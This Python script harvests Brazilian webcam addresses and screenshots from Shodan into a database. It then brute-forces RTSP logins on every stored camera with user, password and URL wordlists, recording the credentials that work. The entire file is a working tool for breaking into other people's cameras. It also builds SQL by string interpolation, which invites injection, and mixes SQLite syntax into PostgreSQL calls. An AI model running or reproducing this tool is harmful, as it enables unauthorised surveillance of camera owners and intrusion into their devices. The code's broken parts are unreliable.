import base64
import itertools
import os
import random
import socket
import logging

import argparse as argparse
import cv2
import psycopg2
import shodan
from dotenv import load_dotenv
from shodan import APIError

from shodan.helpers import get_screenshot

__version__ = '0.1.0'

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s %(message)s',
    handlers=[
        logging.FileHandler("rtsp_scanner.log"),
        logging.StreamHandler()
    ]
)


class Singleton(type):
    _instances = {}

    def __call__(cls, *args, **kwargs):
        logging.info('Singleton call')
        if cls not in cls._instances:
            logging.info('Singleton call if')
            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
        return cls._instances[cls]


class DatabaseConnector(metaclass=Singleton):

    def __init__(self):
        try:
            self.conn = psycopg2.connect(
                database=os.getenv('DB_NAME'),
                host=os.getenv('DB_HOST'),
                user=os.getenv('DB_USER'),
                password=os.getenv('DB_PASSWORD'),
                port=os.getenv('DB_PORT')
            )
            logging.info(f'Connected to {os.getenv("DB_NAME")} database')
        except Exception as e:
            logging.error(f'Error on connect to database: {e}')
            raise e

    def insert_into_cameras(self, ip, port, user, password, url, city, country_code):
        city = city.replace("'", "").replace('"', '').replace(';', '')
        c = self.conn.cursor()
        c.execute(f'''
            INSERT INTO public.cameras (ip, port, "user", "password", url, active, city, country_code, added_at, updated_at, id) VALUES('{ip}', {port}, '{user}', '{password}', '{url}', 0, '{city}', '{country_code}', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, DEFAULT);
        '''.strip(), (ip, port, user, password, url, city, country_code))
        self.conn.commit()

    def insert_into_runs(self, run_name):
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO runs(run_name) VALUES(%s)
        '''.strip(), (run_name,))
        self.conn.commit()

    def get_random_from_db(self):
        c = self.conn.cursor()
        c.execute('''
            SELECT * FROM cameras WHERE active = 1 ORDER BY RANDOM()
        '''.strip())
        result = c.fetchall()
        return result

    def get_from_db(self):
        c = self.conn.cursor()
        c.execute('''
            SELECT * FROM cameras WHERE active = 0
        '''.strip())
        result = c.fetchall()
        return result

    def search_on_db(self, ip, port):
        c = self.conn.cursor()
        c.execute(f'''SELECT * FROM cameras WHERE ip = '{ip}' AND port = {port}''')
        result = c.fetchall()
        return result

    def update_active_from_db(self, ip, port):
        c = self.conn.cursor()
        c.execute(f'''UPDATE cameras SET active = 1 WHERE ip = '{ip}' AND port = {port}'''.strip())
        self.conn.commit()

    def update_from_db_values(self, host, port, user, password, rtsp_string, active):
        c = self.conn.cursor()
        c.execute('''INSERT OR REPLACE INTO cameras (ip, port, user, password, url, active, updated_at) VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP); '''.strip(), (
            host, port, user, password, rtsp_string, active
        ))
        self.conn.commit()


db = DatabaseConnector()


def write_image_to_file(ss, h, p):
    mime = ss['mime'].split('/')[-1]
    with open(f'frames/{h}_{p}.{mime}', 'wb') as img:
        img.write(base64.b64decode(ss['data']))
    logging.debug(f'Image saved to frames/{h}_{p}.{mime}')


def check_rtsp_connection_by_host(host, port, user, password, rtsp_string):
    rtsp_url = rtsp_string.format(user, password, host, port)
    logging.debug(f'{rtsp_url}')
    vcap = cv2.VideoCapture(rtsp_url)
    try:
        ret, frame = vcap.read()
        if not frame:
            logging.debug(f'No frame for {rtsp_url}')
            return None
        logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}, user: {user}, password: {password}')
        db.update_from_db_values(host, port, user, password, rtsp_url, 1)
        return rtsp_url
    except Exception as e:
        logging.error(f'Error: {e}')
        return None
    finally:
        logging.debug(f'Releasing {rtsp_url}')
        vcap.release()


def is_camera(host, port, path):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(f'GET {path} HTTP/1.0\r\n\r\n'.encode())
        res = sock.recv(100)
        if res.find(b'200 OK') > 0:
            db.update_active_from_db(host, port)
            return True
        return False
    except Exception as e:
        return False


def thread_add_cameras_on_db(shodan_key=None):
    if shodan_key:
        logging.debug(f'Starting thread_add_cameras_on_db using key "{shodan_key}"')
        shodan_key = shodan_key
    else:
        logging.debug(f'Starting thread_add_cameras_on_db using key from env')
        shodan_key = os.getenv('SHODAN_KEY')
    # query = 'country:BR cam has_screenshot:true'
    query = 'screenshot.label:webcam,cam country:BR'
    logging.debug(f'Starting thread_add_cameras_on_db using query "{query}"')
    api = shodan.Shodan(shodan_key)
    results = api.search_cursor(query)

    logging.info('Updating database')
    cams_added = 0
    try:
        for banner in results:
            ip, port = banner.get('ip_str'), banner.get('port')
            db_response = db.search_on_db(ip, port)
            if db_response:
                logging.debug(f'{ip}:{port} skipped')
            else:
                city = banner.get('location').get('city')
                country_code = banner.get('location').get('country_code')
                db.insert_into_cameras(ip, port, '.', '.', '.', city, country_code)
                logging.debug(f'{ip}:{port} added')
                cams_added += 1
            if banner.get('screenshot'):
                screenshot = get_screenshot(banner)
                write_image_to_file(screenshot, ip, port)
        logging.info(f'{cams_added} cameras added')
        return cams_added
    except APIError as e:
        logging.error(f'Shodan api error: {e}')
        return cams_added
    except Exception as e:
        logging.error(f'Error: {e}')
        return cams_added

def thread_test_cameras(users_wordlist, passwords_wordlist, rtsp_urls_wordlist, randomize):
    logging.info(f'Starting thread_test_cameras')

    camera_users = open(users_wordlist, 'r').read().splitlines()
    camera_passwords = open(passwords_wordlist, 'r').read().splitlines()
    rtsp_url_type = open(rtsp_urls_wordlist, 'r').read().splitlines()

    if randomize:
        random.shuffle(camera_users)
        random.shuffle(camera_passwords)
        random.shuffle(rtsp_url_type)

    cameras = db.get_random_from_db()
    logging.debug(f'Testing {len(cameras)} cameras')
    camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
    for url, user, password, camera in camera_combinations:
        ip, port = camera[1], camera[2]
        url_login = url.format(user, password, ip, port)
        check_rtsp_connection_by_host(ip, port, user, password, url_login)
    logging.info(f'Executors: finished in thread_test_cameras')


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--start_search', action='store_true', help='Start searching for cameras on Shodan',
                       default=False)
    group.add_argument('--start_check', action='store_true', help='Start testing cameras on DB', default=False)

    parser.add_argument('--threads', action='store', help='Number of threads to check cams', default=1, type=int)
    parser.add_argument('--users', action='store', help='Path to users file', default='users_small.txt')
    parser.add_argument('--passwords', action='store', help='Path to passwords file', default='passwords_small.txt')
    parser.add_argument('--rtsp_urls', action='store', help='Path to rtsp urls file', default='rtsp_urls_small.txt')
    parser.add_argument('--random', action='store_true', help='Randomize users, passwords and rtsp urls', default=True)
    parser.add_argument('--db_name', action='store', help='Name of the database', default='rtsp_scanner.db')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode', default=False)

    def check_paths(args):
        if not os.path.exists(args.users):
            parser.error(f'Users file "{args.users}" not found')
            return False
        if not os.path.exists(args.passwords):
            parser.error(f'Passwords file "{args.passwords}" not found')
            return False
        if not os.path.exists(args.rtsp_urls):
            parser.error(f'RTSP URLs file "{args.rtsp_urls}" not found')
            return False
        if not os.path.exists('frames'):
            logging.info(f'Frames folder not found, creating now')
            os.mkdir('frames')
        return True

    if check_paths(parser.parse_args()):
        return parser.parse_args()

    raise Exception('Error parsing arguments')


def main():
    args = parse_arguments()

    wd_users = args.users
    wd_passwords = args.passwords
    wd_rtsp_urls = args.rtsp_urls

    arg_random = args.random

    verbose = args.verbose
    if verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.info('Verbose mode enabled')
        args_data = vars(args)
        args_data['users'] = {
            'path': wd_users,
            'count': len(open(wd_users, 'r').read().splitlines())
        }
        args_data['passwords'] = {
            'path': wd_passwords,
            'count': len(open(wd_passwords, 'r').read().splitlines())
        }
        args_data['rtsp_urls'] = {
            'path': wd_rtsp_urls,
            'count': len(open(wd_rtsp_urls, 'r').read().splitlines())
        }
        logging.debug(args_data)

    if args.start_search:
        thread_add_cameras_on_db()

    if args.start_check:
        thread_test_cameras(wd_users, wd_passwords, wd_rtsp_urls, arg_random)


if __name__ == '__main__':
    main()

    # db = DatabaseConnector()
    # db.prepare_db()
